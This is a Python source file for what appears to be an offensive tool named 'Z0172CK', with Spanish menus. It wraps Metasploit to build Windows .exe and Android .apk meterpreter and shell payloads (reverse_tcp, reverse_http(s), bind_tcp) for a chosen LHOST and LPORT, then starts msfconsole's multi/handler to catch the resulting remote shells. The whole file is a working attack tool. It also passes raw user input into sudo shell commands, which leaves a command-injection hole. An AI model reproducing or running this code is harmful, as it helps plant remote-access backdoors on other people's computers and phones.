from colorama import Fore, init
#import banners
import banners as banners
import random
import subprocess, sys, os

ProgramName = 'Z0172CK'
LHOST = '0.0.0.0'
LPORT = '444'
PAYLOAD = 'None'
NAME = 'msf'

colors = [Fore.LIGHTBLUE_EX, Fore.LIGHTCYAN_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTMAGENTA_EX, Fore.LIGHTRED_EX]
color = random.choice(colors)

def generate():
    global ProgramName, color, LHOST, LPORT, PAYLOAD, NAME

    banners.println(4)
    print("")
    print("Selecione la Plataforma")
    print("[{}01{}] Windows".format(color, Fore.LIGHTWHITE_EX))
    print("[{}02{}] Android".format(color, Fore.LIGHTWHITE_EX))
    #print("[{}03{}] Linux".format(color, Fore.LIGHTWHITE_EX))
    print("") 

    Plataform = input(str(" {} ({}Metasploit/PayloadGenerate{}) > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))

    if Plataform == '01' or Plataform == '1' or Plataform == 'windows':
        print("")
        print("Selecione el Payload")
        print("[{}01{}] windows/meterpreter/reverse_http".format(color, Fore.LIGHTWHITE_EX)) 
        print("[{}02{}] windows/meterpreter/reverse_https".format(color, Fore.LIGHTWHITE_EX))
        print("[{}03{}] windows/meterpreter/reverse_tcp".format(color, Fore.LIGHTWHITE_EX))
        print("[{}04{}] windows/meterpreter/bind_tcp".format(color, Fore.LIGHTWHITE_EX))
        print("[{}05{}] windows/shell/bind_tcp".format(color, Fore.LIGHTWHITE_EX))
        print("[{}06{}] windows/shell/reverse_tcp".format(color, Fore.LIGHTWHITE_EX))
        print("")

        WindowsPayload = input(str(" {} ({}Metasploit/PayloadGenerate{}) Payload > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))

        if WindowsPayload == '01' or WindowsPayload == '1' or WindowsPayload == 'windows/meterpreter/reverse_http':
            PAYLOAD = 'windows/meterpreter/reverse_http'

        elif WindowsPayload == '02' or WindowsPayload == '2' or WindowsPayload == 'windows/meterpreter/reverse_https':
            PAYLOAD = 'windows/meterpreter/reverse_https'

        elif WindowsPayload == '03' or WindowsPayload == '3' or WindowsPayload == 'windows/meterpreter/reverse_tcp':
            PAYLOAD = 'windows/meterpreter/reverse_tcp'

        elif WindowsPayload == '04' or WindowsPayload == '4' or WindowsPayload == 'windows/meterpreter/bind_tcp':
            PAYLOAD = 'windows/meterpreter/bind_tcp'

        elif WindowsPayload == '05' or WindowsPayload == '5' or WindowsPayload == 'windows/shell/bind_tcp':
            PAYLOAD = 'windows/shell/bind_tcp'

        elif WindowsPayload == '06' or WindowsPayload == '6' or WindowsPayload == 'windows/shell/reverse_tcp':
            PAYLOAD = 'windows/shell/reverse_tcp'

        LHOST = input(str(" {} ({}Metasploit/PayloadGenerate{}) LHOST > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))
        LPORT = input(str(" {} ({}Metasploit/PayloadGenerate{}) LPORT > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))
        NAME = input(str(" {} ({}Metasploit/PayloadGenerate{}) FileName > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))
        os.system(f"sudo msfvenom -p {PAYLOAD} lhost={LHOST} lport={LPORT} -f exe -o output/{NAME}.exe")
        os.system(f"sudo chmod +x output/{NAME}.exe")
        print("{}Achivo Guardado en {}output/{}.exe{}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTRED_EX, NAME, Fore.LIGHTWHITE_EX))
    
    elif Plataform == '02' or Plataform == '2' or Plataform == 'android':
        print("")
        print("{}Selecione el Payload{}".format(color, Fore.LIGHTWHITE_EX))
        print("")
        print("[{}01{}] android/meterpreter/reverse_http".format(color, Fore.LIGHTWHITE_EX))
        print("[{}02{}] android/meterpreter/reverse_https".format(color, Fore.LIGHTWHITE_EX))
        print("[{}03{}] android/meterpreter/reverse_tcp".format(color, Fore.LIGHTWHITE_EX))
        print("")

        AndroidPayload = input(str(" {} ({}Metasploit/GeneratePayload{}) Payload > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))

        if AndroidPayload == '1' or AndroidPayload == '01':
            PAYLOAD = 'android/meterpreter/reverse_http'
        
        elif AndroidPayload == '2' or AndroidPayload == '02':
            PAYLOAD = 'android/meterpreter/reverse_https'
        
        elif AndroidPayload == '3' or AndroidPayload == '03':
            PAYLOAD = 'android/meterpreter/reverse_tcp'

        LHOST = input(str(" {} ({}Metasploit/PayloadGenerate{}) LHOST > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))
        LPORT = input(str(" {} ({}Metasploit/PayloadGenerate{}) LPORT > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))
        NAME = input(str(" {} ({}Metasploit/PayloadGenerate{}) FileName > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))
        os.system(f"sudo msfvenom -p {PAYLOAD} lhost={LHOST} lport={LPORT} -f apk -o output/{NAME}.apk")
        os.system(f"sudo chmod +x output/{NAME}.apk")
        print("{}Achivo Guardado en {}output/{}.apk{}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTRED_EX, NAME, Fore.LIGHTWHITE_EX))

    option = input(str("desea conectarse a Metasploit [y/N] > "))

    if option == 'y' or option == 'Y' or option == 's' or option == 'S':
        datamsf = f"use exploit/multi/handler;set PAYLOAD {PAYLOAD};set LHOST {LHOST};set LPORT {LPORT};exploit"
        subprocess.call(["sudo", "msfconsole", "-q", "-x", datamsf])

def androidPayloadGenerate():
    print("")
    print("{}Selecione el Payload{}".format(color, Fore.LIGHTWHITE_EX))
    print("")
    print("[{}01{}] android/meterpreter/reverse_http".format(color, Fore.LIGHTWHITE_EX))
    print("[{}02{}] android/meterpreter/reverse_https".format(color, Fore.LIGHTWHITE_EX))
    print("[{}03{}] android/meterpreter/reverse_tcp".format(color, Fore.LIGHTWHITE_EX))
    print("")

    AndroidPayload = input(str(" {} ({}Metasploit/GeneratePayload{}) Payload > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))

    if AndroidPayload == '1' or AndroidPayload == '01':
        PAYLOAD = 'android/meterpreter/reverse_http'
        
    elif AndroidPayload == '2' or AndroidPayload == '02':
        PAYLOAD = 'android/meterpreter/reverse_https'
        
    elif AndroidPayload == '3' or AndroidPayload == '03':
        PAYLOAD = 'android/meterpreter/reverse_tcp'

    else:
        print("[!] Option Not Avalible")
        print("")
        androidPayloadGenerate()

    LHOST = input(str(" {} ({}Metasploit/PayloadGenerate{}) LHOST > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))
    LPORT = input(str(" {} ({}Metasploit/PayloadGenerate{}) LPORT > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))
    NAME = input(str(" {} ({}Metasploit/PayloadGenerate{}) FileName > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))

    os.system(f"sudo msfvenom -p {PAYLOAD} lhost={LHOST} lport={LPORT} -o output/{NAME}.apk")
    print("File save in {}output/{}.apk{}".format(Fore.LIGHTGREEN_EX, NAME, Fore.LIGHTWHITE_EX))